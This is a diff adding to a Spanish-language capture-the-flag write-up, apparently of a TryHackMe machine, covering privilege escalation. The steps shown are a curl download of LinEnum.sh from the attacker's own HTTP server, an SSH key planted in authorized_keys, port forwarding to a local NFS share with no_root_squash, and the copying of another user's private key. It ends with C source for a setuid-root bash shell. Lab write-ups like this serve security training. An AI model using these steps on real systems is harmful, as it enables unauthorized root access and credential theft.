@@ -250,4 +250,116 @@ Last login: Wed Nov 18 18:33:57 GMT 2020 from 192.168.170.145 on pts/0
 
 Y con el primer set de credenciales consigo acceso como paradox.
 
+Tras probar un par de cosas para seguir escalando, no encuentro nada, y decido probar con linEnum.sh
+
+Como no hay wget uso curl -O
+
+[paradox@ip-10-129-191-69 ~]$ wget http://192.168.131.65:8080/LinEnum.sh
+wget http://192.168.131.65:8080/LinEnum.sh
+-bash: wget: command not found
+[paradox@ip-10-129-191-69 ~]$ curl -O http://192.168.131.65:8080/LinEnum.sh
+curl -O http://192.168.131.65:8080/LinEnum.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 46631  100 46631    0     0   334k      0 --:--:-- --:--:-- --:--:--  334k
+
+~/scripts$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.191.69 - - [24/Aug/2026 12:51:20] "GET /LinEnum.sh HTTP/1.1" 200 -
+
+La salida es gigante, se la paso a deepseek para que me clasifique las vulnerabilidades por relevancia.
+
+La primera que marca es NFS con no_root_squash (CRÍTICO).
+Al parecer con esta vulnerabilidad puedo acceder como root al server.
+
+Tras intentar montar nfs, me doy cuenta de que es solo accesible localmente.
+
+Tras darle un par de vueltas a como acceder localmente, me doy cuenta de que en el directorio ssh de paradox tengo permisos. Creo una clave publica y privada en mi máquina para paradox y la subo a authorized_keys.
+
+ssh-keygen -f paradox
+Generating public/private ed25519 key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in paradox
+Your public key has been saved in paradox.pub
+The key fingerprint is:
+SHA256:snNRehx9YHoIyBQHD087SXuNB7YwemSdfqpFSvGVrII mksk@mksk-Nitro-AN515-57
+The key's randomart image is:
++--[ED25519 256]--+
+|     o=+X.ooo.   |
+|      o@.OoX+.   |
+|      ..O+Oo= .  |
+|      E.o*=+..   |
+|      ..S+oo     |
+|       o.oo      |
+|      o .o       |
+|       o.        |
+|                 |
++----[SHA256]-----+
+
+Y la meto en authorized_keys.
+
+[paradox@ip-10-129-191-69 .ssh]$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuAuRrCzv04ibScNyWfAat0sEeMmn7YnyKBoZzO1jxG mksk@mksk-Nitro-AN515-57
+<WfAat0sEeMmn7YnyKBoZzO1jxG mksk@mksk-Nitro-AN515-57
+> " >> authorized_keys
+" >> authorized_keys
+
+Hago forwarding de puertos para conseguir acceder a la share nfs.
+
+ssh paradox@10.129.191.69 -i paradox -L 2049:localhost:2049
+
+La monto.
+
+sudo mount -v -t nfs localhost:/ /home/mksk/nfs 
+
+Y veo el directorio en el que he montado la share.
+
+~/nfs$ ls -la /home/mksk/nfs
+total 28
+drwx------  3 mksk mksk   112 nov 17  2020 .
+drwxr-x--- 66 mksk mksk 12288 ago 24 13:15 ..
+lrwxrwxrwx  1 root root     9 nov  8  2020 .bash_history -> /dev/null
+-rw-r--r--  1 mksk mksk    18 nov  8  2019 .bash_logout
+-rw-r--r--  1 mksk mksk   141 nov  8  2019 .bash_profile
+-rw-r--r--  1 mksk mksk   312 nov  8  2019 .bashrc
+drwx------  2 mksk mksk    61 nov  8  2020 .ssh
+-rw-------  1 mksk mksk    38 nov 17  2020 user.flag
+
+
+Consigo la segunda flag.
+
+/nfs$ cat user.flag 
+thm{**********************************}
+
+Aparte, puedo copiar la clave ssh de james.
+
+~/nfs/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+
+cp id_rsa /home/mksk/.ssh/
+
+ssh james@10.129.191.69 -i /home/mksk/.ssh/id_rsa 
+Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
+[james@ip-10-129-191-69 ~]$ ls
+user.flag
+
+Vale, ya puedo acceder a la máquina por ssh como james, para seguir escalando a root.
+Al parecer puedo crear un binario aprovechando los permisos de nfs y ejecutarlo para conseguir una shell como root.
+
+cat > shell.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+EOF
+gcc -o bash shell.c
+
+sudo chown root:root bash
+sudo chmod u+s bash
 
